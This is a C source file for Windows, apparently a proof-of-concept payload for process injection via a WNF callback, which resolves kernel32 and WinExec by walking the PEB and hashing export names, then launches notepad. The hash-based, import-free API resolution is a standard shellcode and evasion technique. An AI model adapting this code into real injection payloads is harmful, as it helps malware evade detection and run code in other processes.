#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winnt.h>
#include <winternl.h>

//
// Windows Definitions
//
typedef struct _WNF_STATE_NAME
{
    ULONG Data[2];
} WNF_STATE_NAME, * PWNF_STATE_NAME;

typedef ULONG WNF_CHANGE_STAMP, * PWNF_CHANGE_STAMP;

typedef struct _WNF_TYPE_ID
{
    GUID TypeId;
} WNF_TYPE_ID, * PWNF_TYPE_ID;

typedef UINT(WINAPI* WinExec_t)(
    LPCSTR lpCmdLine,
    UINT   uCmdShow);

//
// Known Hash Definitions
//
#define KERNEL32_HASH 0x6A4ABC5B // Uppercase Unicode
#define WINEXEC_HASH 0x0D88F668  // Uppercase ASCII

//
// Function Definitions
//
DWORD CalcHash(ULONG_PTR pValue, DWORD nLength)
{
    DWORD hash = 0;

    for (DWORD index = 0; index < nLength; index++)
    {
        hash = ((hash >> 13 | hash << (32 - 13)) & 0xFFFFFFFF);

        if (*((CHAR*)pValue) > 0x60)
            hash += *((CHAR*)pValue) - 0x20;
        else
            hash += *((CHAR*)pValue);

        pValue++;
    }

    return hash;
}


ULONG_PTR GetModuleHandleByHash(DWORD moduleHash)
{
    PUNICODE_STRING pBaseDllName;
    PPEB_LDR_DATA pLdrData;
    PLDR_DATA_TABLE_ENTRY pLdrDataTable;
    ULONG_PTR pModule = 0;

#ifdef _WIN64
    pLdrData = (PPEB_LDR_DATA)(*(PULONG_PTR)((ULONG_PTR)__readgsqword(0x60) + 0x18));
    pLdrDataTable = (PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)pLdrData->InMemoryOrderModuleList.Flink - 0x10);
#elif _WIN32
    pLdrData = (PPEB_LDR_DATA)(*(PULONG_PTR)((ULONG_PTR)__readfsdword(0x30) + 0xC));
    pLdrDataTable = (PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)pLdrData->InMemoryOrderModuleList.Flink - 0x8);
#else
    return nullptr;
#endif

    while (pLdrDataTable->DllBase != NULL)
    {
#ifdef _WIN64
        pBaseDllName = (PUNICODE_STRING)((ULONG_PTR)pLdrDataTable + 0x58);
#elif _WIN32
        pBaseDllName = (PUNICODE_STRING)((ULONG_PTR)pLdrDataTable + 0x2C);
#else
        break;
#endif

        if (CalcHash((ULONG_PTR)pBaseDllName->Buffer, pBaseDllName->Length) == moduleHash)
        {
            pModule = (ULONG_PTR)pLdrDataTable->DllBase;
            break;
        }

#ifdef _WIN64
        pLdrDataTable = (PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)pLdrDataTable->InMemoryOrderLinks.Flink - 0x10);
#elif _WIN32
        pLdrDataTable = (PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)pLdrDataTable->InMemoryOrderLinks.Flink - 0x8);
#else
        break;
#endif
    }

    return pModule;
}


ULONG_PTR GetProcAddressByHash(ULONG_PTR hModule, DWORD procHash)
{
    USHORT machine;
    DWORD e_lfanew;
    DWORD nExportDirectoryOffset;
    DWORD nNumberOfNames;
    DWORD nOrdinal;
    DWORD nStrLen;
    ULONG_PTR pExportDirectory;
    ULONG_PTR pAddressOfFunctions;
    ULONG_PTR pAddressOfNames;
    ULONG_PTR pAddressOfOrdinals;
    LPCSTR procName;
    ULONG_PTR pProc = 0;

    do
    {
        if (*(USHORT*)hModule != 0x5A4D)
            break;

        e_lfanew = *(DWORD*)((ULONG_PTR)hModule + 0x3C);

        if (*(DWORD*)((ULONG_PTR)hModule + e_lfanew) != 0x00004550)
            break;

        machine = *(SHORT*)((ULONG_PTR)hModule + e_lfanew + 0x18);

        if (machine == 0x020B)
            nExportDirectoryOffset = *(DWORD*)((ULONG_PTR)hModule + e_lfanew + 0x88);
        else if (machine == 0x010B)
            nExportDirectoryOffset = *(DWORD*)((ULONG_PTR)hModule + e_lfanew + 0x78);
        else
            break;

        pExportDirectory = (ULONG_PTR)hModule + nExportDirectoryOffset;
        nNumberOfNames = *(DWORD*)((ULONG_PTR)pExportDirectory + 0x18);
        pAddressOfFunctions = (ULONG_PTR)hModule + (ULONG_PTR)(*(DWORD*)((ULONG_PTR)pExportDirectory + 0x1C));
        pAddressOfNames = (ULONG_PTR)hModule + (ULONG_PTR)(*(DWORD*)((ULONG_PTR)pExportDirectory + 0x20));
        pAddressOfOrdinals = (ULONG_PTR)hModule + (ULONG_PTR)(*(DWORD*)((ULONG_PTR)pExportDirectory + 0x24));

        for (DWORD index = 0; index < nNumberOfNames; index++)
        {
            nStrLen = 0;
            procName = (LPCSTR)((ULONG_PTR)hModule + (ULONG_PTR)(*(DWORD*)((ULONG_PTR)pAddressOfNames + ((ULONG_PTR)index * 4))));

            while (procName[nStrLen] != 0)
                nStrLen++;

            if (CalcHash((ULONG_PTR)procName, nStrLen) == procHash)
            {
                nOrdinal = (DWORD)(*(SHORT*)((ULONG_PTR)pAddressOfOrdinals + ((ULONG_PTR)index * 2)));
                pProc = (ULONG_PTR)hModule + (ULONG_PTR)(*(DWORD*)((ULONG_PTR)pAddressOfFunctions + ((ULONG_PTR)nOrdinal * 4)));
                break;
            }
        }
    } while (FALSE);

    return pProc;
}


NTSTATUS NTAPI WnfCallback(
    _In_ WNF_STATE_NAME StateName,
    _In_ WNF_CHANGE_STAMP ChangeStamp,
    _In_ PWNF_TYPE_ID TypeId,
    _In_opt_ PVOID CallbackContext,
    _In_ PVOID Buffer,
    _In_ ULONG BufferSize)
{
    ULONG64 cmdline[2];
    ULONG_PTR pKernel32 = GetModuleHandleByHash(KERNEL32_HASH);
    ULONG_PTR pWinExec = GetProcAddressByHash(pKernel32, WINEXEC_HASH);

    cmdline[0] = *(ULONG64*)"notepad\0";
    return (NTSTATUS)((WinExec_t)pWinExec)((LPCSTR)cmdline, SW_SHOW);
}